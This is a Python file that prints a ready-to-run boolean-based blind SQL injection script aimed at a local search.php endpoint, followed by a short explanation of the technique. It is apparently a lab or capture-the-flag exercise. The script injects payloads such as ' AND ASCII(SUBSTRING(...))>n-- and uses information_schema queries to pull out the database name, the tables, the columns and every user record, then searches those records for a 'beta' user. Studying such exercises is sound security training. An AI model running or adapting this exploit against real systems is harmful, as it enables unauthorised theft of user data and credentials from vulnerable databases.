script = '''
import requests

URL = "http://127.0.0.1:8080/search.php"
COOKIES = {"PHPSESSID": "98894d5dd6e8b65b0ad585865055336a"}

def test_query(payload):
    """Test SQL payload - returns True if condition is true"""
    response = requests.post(URL, data={"username": payload}, cookies=COOKIES)
    # Baseline: "You are connected successfully!<br/> No results"
    # True condition will NOT contain "No results"
    return "No results" not in response.text and "You are connected successfully" in response.text

def binary_search_char(query, position):
    """Extract character at position using binary search"""
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"' AND ASCII(SUBSTRING(({query}),{position},1))>{mid}-- "
        if test_query(payload):
            low = mid + 1
        else:
            high = mid - 1
    
    if low <= 126:
        payload = f"' AND ASCII(SUBSTRING(({query}),{position},1))={low}-- "
        if test_query(payload):
            return chr(low)
    return None

def extract_string(query, max_length=40):
    """Extract complete string character by character"""
    result = ""
    for pos in range(1, max_length + 1):
        char = binary_search_char(query, pos)
        if char is None or ord(char) < 32:
            break
        result += char
        print(f"  Position {pos}: '{char}' -> {result}")
    return result

# STEP 1: Extract database name
print("[STEP 1] Extracting database name...")
database = extract_string("SELECT database()")
print(f"[+] Database: {database}\\n")

# STEP 2: Extract table names
print("[STEP 2] Extracting table names...")
# Count tables
for n in range(1, 10):
    if test_query(f"' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{database}')={n}-- "):
        num_tables = n
        print(f"[+] Number of tables: {n}")
        break

tables = []
for i in range(num_tables):
    print(f"\\nExtracting table {i+1}...")
    query = f"SELECT table_name FROM information_schema.tables WHERE table_schema='{database}' LIMIT {i},1"
    table = extract_string(query, 20)
    tables.append(table)
    print(f"[+] Table: {table}")

# STEP 3: Extract columns from users table
print(f"\\n[STEP 3] Extracting columns from 'users' table...")
for n in range(1, 10):
    if test_query(f"' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='{database}' AND table_name='users')={n}-- "):
        num_cols = n
        print(f"[+] Number of columns: {n}")
        break

columns = []
for i in range(num_cols):
    print(f"\\nExtracting column {i+1}...")
    query = f"SELECT column_name FROM information_schema.columns WHERE table_schema='{database}' AND table_name='users' LIMIT {i},1"
    col = extract_string(query, 20)
    columns.append(col)
    print(f"[+] Column: {col}")

# STEP 4: Count rows
print(f"\\n[STEP 4] Counting rows in users table...")
for n in range(1, 20):
    if test_query(f"' AND (SELECT COUNT(*) FROM users)={n}-- "):
        num_rows = n
        print(f"[+] Number of rows: {n}")
        break

# STEP 5: Extract user data
print(f"\\n[STEP 5] Extracting user data...\\n")
all_users = []

for row in range(num_rows):
    print(f"--- User {row+1}/{num_rows} ---")
    user_data = {}
    for col in columns:
        print(f"Extracting {col}...")
        query = f"SELECT {col} FROM users LIMIT {row},1"
        value = extract_string(query, 50)
        user_data[col] = value
        print(f"  {col}: {value}")
    all_users.append(user_data)
    print()

# STEP 6: Find beta user
print("="*70)
print("SEARCHING FOR BETA USER")
print("="*70)
for idx, user in enumerate(all_users):
    for key, value in user.items():
        if 'beta' in value.lower():
            print(f"\\n[!] FOUND 'beta' in User {idx+1}!")
            print(f"[!] Field: {key}")  
            print(f"[!] Value: {value}")
            print(f"[!] Complete user record:")
            for k, v in user.items():
                print(f"    {k}: {v}")

# Summary
print("\\n" + "="*70)
print("EXTRACTION SUMMARY")
print("="*70)
print(f"Database: {database}")
print(f"Tables: {', '.join(tables)}")
print(f"Columns in users: {', '.join(columns)}")
print(f"\\nAll extracted users:")
for idx, user in enumerate(all_users):
    print(f"\\nUser {idx+1}:")
    for key, value in user.items():
        print(f"  {key}: {value}")
'''

print(script)

print("")
print("="*70)
print("KEY CONCEPTS")
print("="*70)
print("""
1. BOOLEAN-BASED BLIND SQLi: 
   - No direct output, we infer data from TRUE/FALSE responses
   - TRUE: Response shows data (no "No results")
   - FALSE: Response shows "No results"

2. BINARY SEARCH OPTIMIZATION:
   - Instead of testing all 94 printable ASCII chars
   - Use binary search: log2(94) ≈ 7 tests per character
   - Test if ASCII value > midpoint, narrow range, repeat

3. INFORMATION_SCHEMA:
   - information_schema.tables: lists all tables
   - information_schema.columns: lists all columns
   - WHERE clauses filter by database/table

4. SUBSTRING/ASCII FUNCTIONS:
   - SUBSTRING(string, start, length): extracts characters
   - ASCII(char): converts character to numeric value
   - Allows character-by-character extraction

5. PAYLOAD STRUCTURE:
   ' AND (condition)-- 
   - ' closes the original query string
   - AND adds our condition
   - -- comments out rest of query
""")

